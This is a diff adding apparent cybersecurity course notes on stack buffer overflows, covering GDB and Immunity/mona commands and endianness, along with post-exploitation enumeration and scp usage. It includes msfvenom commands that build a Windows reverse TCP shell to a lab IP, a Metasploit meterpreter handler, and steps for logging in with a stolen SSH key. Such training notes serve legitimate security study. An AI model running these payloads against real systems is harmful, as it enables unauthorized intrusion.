@@ -347,8 +347,144 @@ PORT     STATE SERVICE
 80/tcp   open  http
 4444/tcp open  krb524
 
+# day 5-6
 
 
+# Buffer Overflow Common Terms
+* Heap
+* Stack
+* Registers
+* Instruction Pointer
+* Stack Pointer
+* Base Pointer
+* Function
+* Shellcode
+# Buffer Overflow Defenses
+* Non executable (NX) Stack
+* Address Space Layout Randomization (ASLR)
+* Data Execution Prevention (DEP)
+* Stack Canaries
+* Position Independent Excutable (PIE)
+# GDB Uses
+### Common Commands
+```
+disass <FUNCTION>     # Disassemble portion of the program
+info <...>    # Supply info for specific stack areas
+x/256c $<REGISTER>    # Read characters from specific register
+break <address>    # Establish a break point
+run <<<$(echo "asdfghjlklk")    # Goes into standard in of program. It makes it take an arguement before running the program
+info functions    # Lists all the functions
+pdisass main    # Lists the main function. (Can do this to any function)
+info proc map    # Gets a map of the process
+```
+# Demo Linux
+* [Buffer-Overflow-Generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
+  - Look for "EIP" It should have a specific value from the characters you overflowed it with, copy the hex value determine the overflow amount
+* To see the size of the stack, do "info proc map" and note the line with [heap], the line below that has a start addr (this is the start of the stack). Note the end addr of the line that has [stack] in it.
+* find /b command:
+  - `0xff` is jmp
+  - `0xe4` is ESP
+* `\x90` is NOP
+```
+run <<<$(<./script>)0
+# Find out the overflow value
+# Exit
+# Enter a fresh gdb session without peda
+env - gdb ./func    # This allows you to do that ^
+show env    # Lists variables
+unset env <variable>    # This unsets a variable
+info proc map    # Gets a map of the process
+find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4    # find /b <starting location of stack>, <ending location of the stack>, <jmp>, <esp>
+# Take first 4 and make them little endian
+```
+### Flipping bytes from big to little endian
+```
+#0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
+#0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7"
+#0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7"
+#0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"
+```
+### MSFVENOM Command
+* We are tellig it do create a payload that executes msf
+* Then we are telling it that its going to execute the whoami command
+* Then then tell it to not use the NULL Byte
+* Finally we tell it to format it to python
+```
+msfvenom -p /linux/x86/exec CMD=whoami -b '\x00' -f python    # Creates payload
+msfvenom --list payloads    # Lists all the payloads
+
+```
+# Demo Windows
+### The Setup
+* Run strings.exe on the executable
+* Look for vulnerable variables
+* Go to [Buffer-Overflow-Generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) and generate the string that will narrow the buffer offset
+* Make the python [script](scripts.md)
+* Make sure the program crashes and the EIP returns with the value you set
+### Immunity Debugger
+```
+!mona modules    # This looks for vulnerable variables
+!mona jmp -r esp -m "essfunc.dll"    # Looks through the variable for jmp and esp
+```
+### MSFVENOM COMMAND (lhost='LinOPS IP' lport='RHP')
+```
+msfvenom -p windows/shell/reverse_tcp lhost=10.50.30.231 lport=1234 -b "\x00" -f python
+```
+### MSFCONSOLE
+```
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 0.0.0.0
+set lport <PORT SET IN MSFVENOM>
+run
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+## 
+# Lecture
+#### SSH Keys
+* Bring private key to your own box
+* On your box:
+  - `chmod 600 /home/student/stolenkey`
+  - `ssh -i /home/student/stolenkey jane@1.2.3.4`
+#### Local host enumeration
+* `Net User` (Windows)
+* `Cat /etc/passwd` (Linux)
+#### Process Enumeration
+* `Tasklist /v` (Windows)
+* `ps -elf` (Linux)
+#### Service Enumeration
+* `Tasklist /svc` (Windows)
+* `chkconfig` (SysV Linux)
+* `systemctl --type=service` (SystemD Linux)
+#### Network Connection Enumeration
+* `IpConfig /all` (Windows)
+* `IfConfig -a` (SysV Linux)
+* `ip a` (SystemD Linux)
+* `cat /etc/hosts` (Linux)
+# SCP
+* `scp <source> <destination>` (SCP Syntax)
+#### Local to remote
+* `scp /path/to/file.txt student@10.50.xx.xx:/path/to/destination/file.txt`
+#### Remote to local
+* `scp student@10.50.xx.xx:/path/to/destination/file.txt /path/to/destination/file.txt`
+# CTF
+```
+http-enum.nse    # NMAP Script
+
+```
 
 
 
